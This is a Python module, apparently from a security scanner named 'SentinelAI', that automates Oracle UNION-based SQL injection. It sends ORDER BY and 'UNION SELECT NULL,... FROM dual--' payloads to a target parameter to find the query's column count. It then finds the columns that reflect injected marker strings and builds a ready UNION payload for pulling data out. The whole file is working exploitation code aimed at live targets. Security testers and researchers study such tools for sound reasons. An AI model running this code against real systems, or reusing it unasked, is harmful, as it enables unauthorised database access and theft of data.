# app/modules/scanner/column_detector.py
"""
Automatic Column Count Detection and Reflective Column Discovery for SentinelAI.
Phase 9: Column Detection and Reflection Discovery
"""

import logging
import time
from dataclasses import dataclass, field
from typing import Any

import requests

from .html_parser import HTMLParser
from .regex_utils import RegexUtils
from .union_sqli import UnionSQLi

# ============================================================
# Data Classes
# ============================================================


@dataclass
class ColumnDetectionResult:
    """
    Column detection and reflection discovery result.
    Contains column count and reflective column information.
    """

    success: bool = False
    column_count: int = 0
    reflective_columns: list[int] = field(default_factory=list)
    reflective_column_count: int = 0
    union_payload: str | None = None
    confidence: int = 0
    method_used: str = ""  # ORDER_BY, UNION_NULL, BOTH
    execution_time: float = 0.0
    attempts: int = 0
    errors: list[str] = field(default_factory=list)
    raw_responses: dict[str, str] = field(default_factory=dict)

    # Column details
    column_details: dict[int, dict[str, Any]] = field(default_factory=dict)

    def add_error(self, error: str):
        """Add an error to the result."""
        self.errors.append(error)

    def add_column_detail(self, index: int, detail: dict[str, Any]):
        """Add detail for a specific column."""
        self.column_details[index] = detail

    def get_summary(self) -> str:
        """Get a summary of the column detection result."""
        if not self.success:
            return "Column detection failed"

        parts = []
        if self.column_count > 0:
            parts.append(f"Columns: {self.column_count}")
        if self.reflective_columns:
            parts.append(f"Reflective: {len(self.reflective_columns)} columns")
            parts.append(f"Reflective indices: {self.reflective_columns[:5]}...")
        if self.confidence > 0:
            parts.append(f"Confidence: {self.confidence}%")
        if self.method_used:
            parts.append(f"Method: {self.method_used}")
        if self.errors:
            parts.append(f"Errors: {len(self.errors)}")

        return (
            f"Column Detection: {', '.join(parts)}"
            if parts
            else "Column Detection: No data"
        )

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary for logging/output."""
        return {
            "success": self.success,
            "column_count": self.column_count,
            "reflective_columns": self.reflective_columns,
            "reflective_column_count": self.reflective_column_count,
            "union_payload": self.union_payload,
            "confidence": self.confidence,
            "method_used": self.method_used,
            "execution_time": self.execution_time,
            "attempts": self.attempts,
            "errors": self.errors,
            "column_details": self.column_details,
            "summary": self.get_summary(),
        }


# ============================================================
# Main Column Detector Class
# ============================================================


class OracleColumnDetector:
    """
    Automatic Column Count Detection and Reflective Column Discovery.
    Phase 9: Detects column count and discovers reflective columns.
    """

    # ============================================================
    # Constants
    # ============================================================

    # Detection methods
    METHOD_ORDER_BY = "ORDER_BY"
    METHOD_UNION_NULL = "UNION_NULL"
    METHOD_BOTH = "BOTH"

    # Confidence thresholds
    CONFIDENCE_LOW = 40
    CONFIDENCE_MEDIUM = 60
    CONFIDENCE_HIGH = 80
    CONFIDENCE_VERY_HIGH = 95

    # Default values
    DEFAULT_MAX_COLUMNS = 30
    DEFAULT_TIMEOUT = 10
    DEFAULT_RETRIES = 3
    MAX_ORDER_BY_ATTEMPTS = 50

    # Oracle-specific payload templates
    UNION_NULL_TEMPLATE = "UNION SELECT {nulls} FROM dual"
    UNION_NUMERIC_TEMPLATE = "UNION SELECT {values} FROM dual"
    ORDER_BY_TEMPLATE = "ORDER BY {column}"

    # Test values for reflection detection
    REFLECTION_TEST_VALUES = [
        ("SENTINEL", "SENTINEL"),
        ("AAA", "AAA"),
        ("BBB", "BBB"),
        ("CCC", "CCC"),
        ("12345", "12345"),
        ("TEST", "TEST"),
    ]

    # ============================================================
    # Initialization
    # ============================================================

    def __init__(
        self,
        session: requests.Session,
        base_url: str,
        logger: logging.Logger | None = None,
    ):
        """
        Initialize Oracle Column Detector.

        Args:
            session: Requests session for HTTP requests
            base_url: Target base URL
            logger: Optional logger instance
        """
        self.session = session
        self.base_url = base_url
        self.logger = logger or self._setup_logger()

        # Initialize components
        self.union_sqli = UnionSQLi(session, base_url, logger)
        self.html_parser = HTMLParser()
        self.regex_utils = RegexUtils()

        # State
        self.baseline_response = None
        self.baseline_size = 0
        self.column_result = None

        self.logger.info("[ColumnDetector] Module initialized for column detection")
        self.logger.info(f"[ColumnDetector] Target: {base_url}")

    def _setup_logger(self) -> logging.Logger:
        """Set up default logger."""
        logger = logging.getLogger("ColumnDetector")
        logger.setLevel(logging.DEBUG)

        if not logger.handlers:
            ch = logging.StreamHandler()
            ch.setLevel(logging.DEBUG)
            formatter = logging.Formatter(
                "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
            )
            ch.setFormatter(formatter)
            logger.addHandler(ch)

        return logger

    # ============================================================
    # Private Methods
    # ============================================================

    def _get_baseline(self, injection_point: str) -> requests.Response | None:
        """Get baseline response for comparison."""
        if self.baseline_response is None:
            self.logger.info("[ColumnDetector] Fetching baseline response...")
            self.baseline_response = self.union_sqli.get_baseline(injection_point)

            if self.baseline_response:
                self.baseline_size = len(self.baseline_response.text)
                self.logger.info(
                    f"[ColumnDetector] Baseline size: {self.baseline_size} bytes"
                )
            else:
                self.logger.warning("[ColumnDetector] Failed to get baseline response")

        return self.baseline_response

    def _send_payload_with_metrics(
        self, injection_point: str, payload: str, baseline: requests.Response | None
    ) -> dict[str, Any]:
        """Send payload and collect metrics."""
        start_time = time.time()

        result = self.union_sqli.test_payload(injection_point, payload, baseline)

        elapsed = time.time() - start_time

        if not result["success"] or result.get("response") is None:
            return {
                "success": False,
                "response": None,
                "size": 0,
                "time": elapsed,
                "has_changed": False,
                "error": "Request failed",
            }

        response = result["response"]
        response_text = response.text

        return {
            "success": True,
            "response": response,
            "response_text": response_text,
            "size": len(response_text),
            "time": elapsed,
            "has_changed": result.get("has_changed", False),
            "status_code": response.status_code,
        }

    def _detect_reflective_columns(
        self, injection_point: str, column_count: int
    ) -> list[int]:
        """
        Detect which columns are reflective.

        Args:
            injection_point: Parameter to inject into
            column_count: Number of columns

        Returns:
            List[int]: Indices of reflective columns (1-based)
        """
        self.logger.info(
            f"[ColumnDetector] Detecting reflective columns (columns: {column_count})..."
        )

        reflective_indices = []
        baseline = self._get_baseline(injection_point)

        for idx in range(1, column_count + 1):
            self.logger.debug(
                f"[ColumnDetector] Testing column {idx} for reflection..."
            )

            # Create test value with column index
            test_value = f"COL{idx}"
            values = ["NULL"] * column_count
            values[idx - 1] = f"'{test_value}'"

            payload = self.UNION_NUMERIC_TEMPLATE.format(values=",".join(values))
            payload = f"{payload}--"

            result = self._send_payload_with_metrics(injection_point, payload, baseline)

            if result["success"] and result["response_text"]:
                # Check if test value appears in response
                if test_value in result["response_text"]:
                    reflective_indices.append(idx)
                    self.logger.info(f"[ColumnDetector] Column {idx} is reflective")
                else:
                    self.logger.debug(
                        f"[ColumnDetector] Column {idx} is NOT reflective"
                    )

        self.logger.info(
            f"[ColumnDetector] Found {len(reflective_indices)} reflective columns: {reflective_indices}"
        )
        return reflective_indices

    def _detect_by_order_by(self, injection_point: str, max_columns: int = 30) -> int:
        """
        Detect column count using ORDER BY method.

        Args:
            injection_point: Parameter to inject into
            max_columns: Maximum columns to test

        Returns:
            int: Number of columns found
        """
        self.logger.info("[ColumnDetector] Detecting column count using ORDER BY...")

        baseline = self._get_baseline(injection_point)

        for column in range(1, min(max_columns + 1, self.MAX_ORDER_BY_ATTEMPTS)):
            payload = f"'{self.ORDER_BY_TEMPLATE.format(column=column)}--"

            self.logger.debug(f"[ColumnDetector] Testing ORDER BY {column}")

            result = self._send_payload_with_metrics(injection_point, payload, baseline)

            if not result["success"]:
                continue

            # Check for error patterns (Oracle errors or page changes)
            if (
                "ORA-" in result["response_text"]
                or "error" in result["response_text"].lower()
            ):
                # If error occurs at column n, then n-1 is the max
                if column > 1:
                    self.logger.info(
                        f"[ColumnDetector] ORDER BY {column} failed, found {column - 1} columns"
                    )
                    return column - 1
                else:
                    self.logger.warning(
                        "[ColumnDetector] ORDER BY 1 failed, trying other method"
                    )
                    return 0

            # If response changed significantly, we might have found the limit
            size_diff = abs(result["size"] - self.baseline_size)
            if size_diff > 100:
                self.logger.info(
                    f"[ColumnDetector] ORDER BY {column} caused significant change"
                )
                # Check if it's the last working column
                if column > 1:
                    # Verify by testing one more
                    next_payload = (
                        f"'{self.ORDER_BY_TEMPLATE.format(column=column + 1)}--"
                    )
                    next_result = self._send_payload_with_metrics(
                        injection_point, next_payload, baseline
                    )
                    if (
                        next_result["success"]
                        and "ORA-" in next_result["response_text"]
                    ):
                        return column

        self.logger.warning(
            f"[ColumnDetector] ORDER BY detection failed, tried up to {max_columns} columns"
        )
        return 0

    def _detect_by_union_null(self, injection_point: str, max_columns: int = 30) -> int:
        """
        Detect column count using UNION NULL method.

        Args:
            injection_point: Parameter to inject into
            max_columns: Maximum columns to test

        Returns:
            int: Number of columns found
        """
        self.logger.info("[ColumnDetector] Detecting column count using UNION NULL...")

        baseline = self._get_baseline(injection_point)

        for count in range(1, max_columns + 1):
            nulls = ",".join(["NULL"] * count)
            payload = f"'{self.UNION_NULL_TEMPLATE.format(nulls=nulls)}--"

            self.logger.debug(
                f"[ColumnDetector] Testing UNION NULL with {count} columns"
            )

            result = self._send_payload_with_metrics(injection_point, payload, baseline)

            if not result["success"]:
                continue

            # Check for Oracle errors (indicates column mismatch)
            if (
                "ORA-00933" in result["response_text"]
                or "ORA-00904" in result["response_text"]
            ):
                # Column mismatch - we've exceeded the actual column count
                if count > 1:
                    self.logger.info(
                        f"[ColumnDetector] UNION NULL with {count} columns failed, found {count - 1} columns"
                    )
                    return count - 1
                else:
                    return 0

            # Check for successful UNION (no error, response changed)
            if result["size"] != self.baseline_size:
                self.logger.info(
                    f"[ColumnDetector] UNION NULL with {count} columns succeeded"
                )
                # Continue to check if more columns work
                continue
            else:
                # If no change and no error, we might have found the limit
                if count > 1:
                    return count - 1

        # If all tests passed, return max_columns
        self.logger.info(
            f"[ColumnDetector] UNION NULL succeeded for all {max_columns} columns"
        )
        return max_columns

    def _generate_union_payload(
        self, column_count: int, reflective_indices: list[int]
    ) -> str | None:
        """
        Generate a UNION payload using reflective columns.

        Args:
            column_count: Total number of columns
            reflective_indices: Indices of reflective columns

        Returns:
            Optional[str]: UNION payload or None
        """
        self.logger.info("[ColumnDetector] Generating UNION payload...")

        if not reflective_indices:
            self.logger.warning(
                "[ColumnDetector] No reflective columns found, using NULL payload"
            )
            nulls = ",".join(["NULL"] * column_count)
            return f"UNION SELECT {nulls} FROM dual--"

        # Use reflective columns for better detection
        values = ["NULL"] * column_count
        for idx in reflective_indices[:3]:  # Use up to 3 reflective columns
            values[idx - 1] = f"'SENTINEL_{idx}'"

        payload = f"UNION SELECT {','.join(values)} FROM dual--"
        self.logger.info(f"[ColumnDetector] Generated UNION payload: {payload[:50]}...")

        return payload

    # ============================================================
    # Public Methods
    # ============================================================

    def detect_column_count(
        self,
        injection_point: str,
        max_columns: int = DEFAULT_MAX_COLUMNS,
        timeout: int = DEFAULT_TIMEOUT,
        retries: int = DEFAULT_RETRIES,
    ) -> ColumnDetectionResult:
        """
        Detect column count using multiple methods.

        Args:
            injection_point: Parameter to inject into
            max_columns: Maximum columns to test
            timeout: Timeout in seconds
            retries: Number of retries

        Returns:
            ColumnDetectionResult: Detection result
        """
        self.logger.info(
            "[ColumnDetector] =================================================="
        )
        self.logger.info("[ColumnDetector] PHASE 9: Column Count Detection")
        self.logger.info(
            "[ColumnDetector] =================================================="
        )

        result = ColumnDetectionResult()
        total_start = time.time()
        method_used = []

        try:
            # Get baseline
            baseline = self._get_baseline(injection_point)
            if not baseline:
                result.add_error("Failed to get baseline response")
                return result

            # Method 1: ORDER BY detection
            self.logger.info("[ColumnDetector] Method 1: ORDER BY detection...")
            order_by_count = self._detect_by_order_by(injection_point, max_columns)

            if order_by_count > 0:
                method_used.append(self.METHOD_ORDER_BY)
                result.column_count = order_by_count
                result.confidence = max(result.confidence, 70)
                self.logger.info(
                    f"[ColumnDetector] ORDER BY found {order_by_count} columns"
                )

            # Method 2: UNION NULL detection
            self.logger.info("[ColumnDetector] Method 2: UNION NULL detection...")
            union_count = self._detect_by_union_null(injection_point, max_columns)

            if union_count > 0:
                method_used.append(self.METHOD_UNION_NULL)
                if union_count > result.column_count:
                    result.column_count = union_count
                    result.confidence = max(result.confidence, 80)
                self.logger.info(
                    f"[ColumnDetector] UNION NULL found {union_count} columns"
                )

            # Determine final column count
            if result.column_count == 0:
                # Try both methods again with more attempts
                self.logger.info("[ColumnDetector] Retrying with extended range...")
                order_by_count = self._detect_by_order_by(
                    injection_point, max_columns + 10
                )
                if order_by_count > 0:
                    result.column_count = order_by_count
                    result.confidence = max(result.confidence, 60)

                union_count = self._detect_by_union_null(
                    injection_point, max_columns + 10
                )
                if union_count > 0 and union_count > result.column_count:
                    result.column_count = union_count
                    result.confidence = max(result.confidence, 70)

            # Set method used
            if len(method_used) >= 2:
                result.method_used = self.METHOD_BOTH
            elif method_used:
                result.method_used = method_used[0]

            # If we found columns, detect reflective columns
            if result.column_count > 0:
                result.attempts = 1
                result.confidence = min(result.confidence + 10, 100)

                # Detect reflective columns
                self.logger.info("[ColumnDetector] Detecting reflective columns...")
                reflective_indices = self._detect_reflective_columns(
                    injection_point, result.column_count
                )

                result.reflective_columns = reflective_indices
                result.reflective_column_count = len(reflective_indices)

                # Generate UNION payload
                union_payload = self._generate_union_payload(
                    result.column_count, reflective_indices
                )
                result.union_payload = union_payload

                # Add column details
                for idx in reflective_indices:
                    result.add_column_detail(
                        idx,
                        {
                            "reflective": True,
                            "index": idx,
                            "confidence": 90,
                        },
                    )

                # If we have reflective columns, confidence is high
                if reflective_indices:
                    result.confidence = max(result.confidence, 90)

                result.success = True
            else:
                result.add_error("Failed to detect column count with any method")
                result.success = False

        except Exception as e:
            error_msg = f"Column detection failed: {e!s}"
            self.logger.error(error_msg)
            result.add_error(error_msg)
            result.success = False

        result.execution_time = time.time() - total_start

        self.logger.info(
            "[ColumnDetector] =================================================="
        )
        self.logger.info("[ColumnDetector] COLUMN DETECTION COMPLETE")
        self.logger.info(f"[ColumnDetector] {result.get_summary()}")
        self.logger.info(f"[ColumnDetector] Time: {result.execution_time:.2f}s")
        self.logger.info(
            "[ColumnDetector] =================================================="
        )

        self.column_result = result
        return result

    def detect_union_columns(
        self, injection_point: str, max_columns: int = DEFAULT_MAX_COLUMNS
    ) -> ColumnDetectionResult:
        """
        Detect column count using UNION method only.

        Args:
            injection_point: Parameter to inject into
            max_columns: Maximum columns to test

        Returns:
            ColumnDetectionResult: Detection result
        """
        self.logger.info("[ColumnDetector] Detecting UNION columns...")

        result = ColumnDetectionResult()
        total_start = time.time()

        try:
            column_count = self._detect_by_union_null(injection_point, max_columns)

            if column_count > 0:
                result.column_count = column_count
                result.method_used = self.METHOD_UNION_NULL
                result.confidence = 80

                # Detect reflective columns
                reflective_indices = self._detect_reflective_columns(
                    injection_point, column_count
                )
                result.reflective_columns = reflective_indices
                result.reflective_column_count = len(reflective_indices)

                # Generate payload
                union_payload = self._generate_union_payload(
                    column_count, reflective_indices
                )
                result.union_payload = union_payload

                result.success = True
            else:
                result.add_error("Failed to detect UNION columns")
                result.success = False

        except Exception as e:
            error_msg = f"UNION column detection failed: {e!s}"
            self.logger.error(error_msg)
            result.add_error(error_msg)
            result.success = False

        result.execution_time = time.time() - total_start
        self.column_result = result
        return result

    def find_reflective_column(
        self, injection_point: str, column_count: int
    ) -> list[int]:
        """
        Find reflective columns in a UNION query.

        Args:
            injection_point: Parameter to inject into
            column_count: Number of columns

        Returns:
            List[int]: Indices of reflective columns
        """
        self.logger.info(
            f"[ColumnDetector] Finding reflective columns (columns: {column_count})..."
        )

        return self._detect_reflective_columns(injection_point, column_count)

    def generate_union_payload(
        self, column_count: int, reflective_indices: list[int] | None = None
    ) -> str | None:
        """
        Generate a UNION payload for the given column count.

        Args:
            column_count: Number of columns
            reflective_indices: Indices of reflective columns

        Returns:
            Optional[str]: UNION payload or None
        """
        self.logger.info(
            f"[ColumnDetector] Generating UNION payload for {column_count} columns..."
        )

        if not reflective_indices:
            reflective_indices = []

        return self._generate_union_payload(column_count, reflective_indices)

    def get_best_union_payload(self, injection_point: str) -> str | None:
        """
        Get the best UNION payload for the detected columns.

        Args:
            injection_point: Parameter to inject into

        Returns:
            Optional[str]: Best UNION payload or None
        """
        self.logger.info("[ColumnDetector] Getting best UNION payload...")

        # First, detect column count if not already done
        if self.column_result is None or self.column_result.column_count == 0:
            result = self.detect_column_count(injection_point)
            if not result.success:
                return None

        return self.column_result.union_payload

    def verify_column_count(self, injection_point: str, column_count: int) -> bool:
        """
        Verify a column count by testing with a valid UNION payload.

        Args:
            injection_point: Parameter to inject into
            column_count: Column count to verify

        Returns:
            bool: True if verified
        """
        self.logger.info(f"[ColumnDetector] Verifying column count: {column_count}...")

        baseline = self._get_baseline(injection_point)
        nulls = ",".join(["NULL"] * column_count)
        payload = f"'{self.UNION_NULL_TEMPLATE.format(nulls=nulls)}--"

        result = self._send_payload_with_metrics(injection_point, payload, baseline)

        if not result["success"]:
            return False

        # Check for success indicators
        if "ORA-" in result["response_text"]:
            return False

        # If response changed, likely successful
        return result["has_changed"] or result["size"] != self.baseline_size
